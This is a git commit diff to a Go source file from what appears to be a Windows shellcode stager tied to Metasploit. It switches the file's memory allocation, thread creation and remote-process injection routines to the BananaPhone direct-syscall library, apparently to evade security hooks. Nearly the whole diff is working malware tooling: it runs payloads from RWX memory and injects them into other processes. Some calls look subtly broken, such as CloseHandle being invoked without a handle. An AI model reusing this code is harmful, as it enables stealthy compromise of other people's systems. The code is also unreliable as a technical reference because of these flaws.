0d047f49cc8eb60cd8ca686190d11cfc3ada7f16
Vyrus <vyrus001@gmail.com>
2021-01-29 15:57:40 -0800

    now with 100% more bananaphone!

--- internal.go
+++ internal.go
@@ -4,27 +4,41 @@ import (
 	"encoding/binary"
 	"net"
 	"reflect"
-	"syscall"
 	"unsafe"
+
+	bananaphone "github.com/c-sto/BananaPhone/pkg/BananaPhone"
 )
 
 var (
-	kernel32             = syscall.MustLoadDLL("kernel32.dll")
-	ntdll                = syscall.MustLoadDLL("ntdll.dll")
-	virtualAlloc         = kernel32.MustFindProc("VirtualAlloc")
-	virtualAllocEx       = kernel32.MustFindProc("VirtualAllocEx")
-	rtlCopyMemory        = ntdll.MustFindProc("RtlCopyMemory")
-	createThread         = kernel32.MustFindProc("CreateThread")
-	openProcess          = kernel32.MustFindProc("OpenProcess")
-	writeProcessMemory   = kernel32.MustFindProc("WriteProcessMemory")
-	createRemoteThreadEx = kernel32.MustFindProc("CreateRemoteThreadEx")
-	closeHandle          = kernel32.MustFindProc("CloseHandle")
+	bp      *bananaphone.BananaPhone
+	bpFuncs map[string]uint16
 )
 
 func init() {
 	// msf mode setings
 	CHECKSUMMODE = 92
 	PLATFORM = 1
+
+	bpFuncs = make(map[string]uint16)
+}
+
+func callWinAPI(fncName string, args ...uintptr) (uintptr, error) {
+	if bp == nil {
+		thisBP, err := bananaphone.NewBananaPhone(bananaphone.DiskBananaPhoneMode)
+		if err != nil {
+			return uintptr(0), err
+		}
+		bp = thisBP
+	}
+	if _, ok := bpFuncs[fncName]; !ok {
+		fnc, err := bp.GetSysID(fncName)
+		if err != nil {
+			return uintptr(0), err
+		}
+		bpFuncs[fncName] = fnc
+	}
+	retVal, err := bananaphone.Syscall(bpFuncs[fncName], args...)
+	return uintptr(retVal), err
 }
 
 // return a socket file descriptor as 4 bytes
@@ -39,21 +53,13 @@ func getFDBytes(conn *net.TCPConn) []byte {
 }
 
 func callPayload(payload []byte) error {
-	addr, _, err := virtualAlloc.Call(0, uintptr(len(payload)), 0x1000|0x2000, 0x40)
-	if addr == 0 {
-		return err
-	}
-	_, _, err = rtlCopyMemory.Call(addr, uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)))
-	if err != nil {
-		if err.Error() != "The operation completed successfully." {
-			return err
-		}
-	}
-	handle, _, err := createThread.Call(0, 0, uintptr(addr), 0, 0, 0)
+	addr, err := callWinAPI("VirtualAlloc", 0, uintptr(len(payload)), 0x1000|0x2000, 0x40)
+	bananaphone.WriteMemory(payload, addr)
+	handle, err := callWinAPI("CreateThread", 0, 0, addr, 0, 0, 0)
 	if handle == 0 {
 		return err
 	}
-	_, err = syscall.WaitForSingleObject(syscall.Handle(handle), uint32(0xffffffff))
+	_, err = callWinAPI("WaitForSingleObject", handle, uintptr(0xffffffff))
 	if err != nil {
 		return err
 	}
@@ -61,34 +67,24 @@ func callPayload(payload []byte) error {
 }
 
 func injectPayload(payload []byte, pid int) error {
-	handle, _, err := openProcess.Call(
-		// PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ,
-		0x0002|0x0400|0x0008|0x0020|0x0010,
-		uintptr(0),
-		uintptr(int(pid)),
-	)
+	// PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ
+	handle, err := callWinAPI("OpenProcess", 0x0002|0x0400|0x0008|0x0020|0x0010, uintptr(0), uintptr(pid))
 	if handle == 0 {
 		return err
 	}
-	addr, _, err := virtualAllocEx.Call(
-		handle, 0, uintptr(len(payload)),
-		// MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
-		0x1000|0x2000, 0x40,
-	)
+	// MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
+	addr, err := callWinAPI("VirtualAllocEx", handle, 0, uintptr(len(payload)), 0x1000|0x2000, 0x40)
 	if addr == 0 {
 		return err
 	}
-	writeProcResult, _, err := writeProcessMemory.Call(handle, addr, uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)), 0)
-	if writeProcResult == 0 {
-		return err
-	}
-	_, _, err = createRemoteThreadEx.Call(handle, 0, 0, addr, 0, 0, 0)
+	bananaphone.WriteMemory(payload, addr)
+	_, err = callWinAPI("CreateRemoteThreadEx", handle, 0, 0, addr, 0, 0, 0)
 	if err != nil {
 		if err.Error() != "The operation completed successfully." {
 			return err
 		}
 	}
-	_, _, err = closeHandle.Call(handle)
+	_, err = callWinAPI("CloseHandle")
 	if err != nil {
 		if err.Error() != "The operation completed successfully." {
 			return err
